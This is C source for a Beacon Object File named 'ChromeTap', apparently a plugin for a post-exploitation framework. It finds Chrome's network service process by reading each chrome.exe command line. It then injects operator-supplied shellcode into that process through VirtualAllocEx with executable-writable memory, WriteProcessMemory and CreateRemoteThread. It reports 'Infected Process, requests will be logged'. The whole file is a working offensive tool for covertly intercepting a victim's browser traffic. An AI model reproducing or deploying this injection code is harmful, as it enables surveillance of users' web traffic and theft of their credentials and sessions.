#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

#include "beacon.h"
#include "main_winapi.h"

BOOL IsNetworkProc(DWORD dwPid)
{
	PPEB pPeb;
	HANDLE hProcess;
	NTSTATUS ntStatus;
	BOOL bStatus = FALSE;
	PWSTR lpwBufferLocal;
	PROCESS_BASIC_INFORMATION BasicInfo;

	MSVCRT$memset(&BasicInfo, '\0', sizeof(BasicInfo));

	if ((hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid)) == INVALID_HANDLE_VALUE)
	{
		bStatus = FALSE;
	
		BeaconPrintf(CALLBACK_ERROR, "OpenProcess()");
		goto Cleanup;
	}

	if ((ntStatus = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &BasicInfo, sizeof(BasicInfo), NULL)) != STATUS_SUCCESS)
	{
		bStatus = FALSE;

		BeaconPrintf(CALLBACK_ERROR, "NtQueryInformationProcess(): %d", ntStatus);
		goto Cleanup;
	}

	pPeb = BasicInfo.PebBaseAddress;

	PPEB pPebLocal = (PPEB)MSVCRT$malloc(sizeof(PEB));
	if (pPebLocal == NULL)
	{
		bStatus = FALSE;

		BeaconPrintf(CALLBACK_ERROR, "malloc 1()");
		goto Cleanup;
	}

	if (KERNEL32$ReadProcessMemory(hProcess, pPeb, pPebLocal, sizeof(PEB), NULL) == 0)
	{
		bStatus = FALSE;

		BeaconPrintf(CALLBACK_ERROR, "ReadProcessMemory 1()");
		goto Cleanup;
	}

	PRTL_USER_PROCESS_PARAMETERS pRtlProcParam = pPebLocal->ProcessParameters;
	PRTL_USER_PROCESS_PARAMETERS pRtlProcParamCopy = (PRTL_USER_PROCESS_PARAMETERS)MSVCRT$malloc(sizeof(RTL_USER_PROCESS_PARAMETERS));

	if (pRtlProcParamCopy == NULL)
	{
		bStatus = FALSE;

		BeaconPrintf(CALLBACK_ERROR, "malloc 2()");
		goto Cleanup;
	}

	if (!KERNEL32$ReadProcessMemory(hProcess, pRtlProcParam, pRtlProcParamCopy, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL))
	{
		bStatus = FALSE;

		BeaconPrintf(CALLBACK_ERROR, "malloc 3()");
		goto Cleanup;
	}

	USHORT len =  pRtlProcParamCopy->CommandLine.Length;
	PWSTR lpwBuffer = pRtlProcParamCopy->CommandLine.Buffer;
	
	if ((lpwBufferLocal = (PWSTR)MSVCRT$malloc(len)) == NULL)
	{
		bStatus = FALSE;

		BeaconPrintf(CALLBACK_ERROR, "malloc 4()");
		goto Cleanup;
	}

	if (!KERNEL32$ReadProcessMemory(hProcess, lpwBuffer, lpwBufferLocal, len, NULL))
	{
		bStatus = FALSE;

		BeaconPrintf(CALLBACK_ERROR, "ReadProcessMemory 2()");
		goto Cleanup;
	}

	if (MSVCRT$wcsstr(lpwBufferLocal, L"--utility-sub-type=network.mojom.NetworkService") != NULL)
	{
		bStatus = TRUE;
	}

	goto Cleanup;

Cleanup:
	if (hProcess) { KERNEL32$CloseHandle(hProcess); }

	return bStatus;
}

DWORD GetChromeNetworkProc()
{
	DWORD dwPid = 0;
	HANDLE hSnapshot;
	PROCESSENTRY32 pe32 = {0};

	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (!hSnapshot)
	{
		goto Cleanup;
	}

	if (KERNEL32$Process32First(hSnapshot, &pe32))
	{
		do
		{
			if (MSVCRT$strcmp(pe32.szExeFile, "chrome.exe") == 0)
			{
				if (IsNetworkProc(pe32.th32ProcessID))
				{
					dwPid = pe32.th32ProcessID;
					goto Cleanup;
				}
			}
		} while(KERNEL32$Process32Next(hSnapshot, &pe32));
	}

Cleanup:
	if (hSnapshot) { KERNEL32$CloseHandle(hSnapshot); }

	return dwPid;
}

BOOL InjectShellcode(DWORD dwChromePid, DWORD dwShcLen, LPVOID lpShcBuf)
{
	LPVOID lpBuffer;
	HANDLE hProcess, hThread;

	hProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, 0, dwChromePid);
	if (!hProcess)
	{
		return FALSE;
	}

	lpBuffer = KERNEL32$VirtualAllocEx(hProcess, NULL, (SIZE_T)dwShcLen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpBuffer == NULL)
	{
		return FALSE;
	}

	KERNEL32$WriteProcessMemory(hProcess, lpBuffer, lpShcBuf, dwShcLen, NULL);

	KERNEL32$CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, 0, NULL);
	if (hThread == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

	return TRUE;
}

VOID go( 
	IN PCHAR lpcBuffer, 
	IN ULONG ulLength 
) 
{
	datap dpParse;
    LPVOID lpBuffer = NULL;
	DWORD dwBufLen, dwChromePid = 0;

	BeaconDataParse(&dpParse, lpcBuffer, ulLength);

    dwBufLen = BeaconDataInt(&dpParse);
	lpBuffer = BeaconDataExtract(&dpParse, NULL);

    if (dwBufLen == 0 || lpBuffer == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR, "ChromeTap: Failed to extract shellcode, have you changed the CNA?");
		goto Cleanup;
	}

	if ((dwChromePid = GetChromeNetworkProc()) == 0)
	{
		BeaconPrintf(CALLBACK_ERROR, "ChromeTap: Failed to find chrome's network service, is it running?");
		goto Cleanup;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "[ChromeTap] Network Service PID: %d", dwChromePid);

	if (!InjectShellcode(dwChromePid, dwBufLen, lpBuffer))
	{
		BeaconPrintf(CALLBACK_ERROR, "ChromeTap: Failed to inject shellcode");
		goto Cleanup;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "[ChromeTap] Infected Process, requests will be logged", dwChromePid);

Cleanup:
	return;
}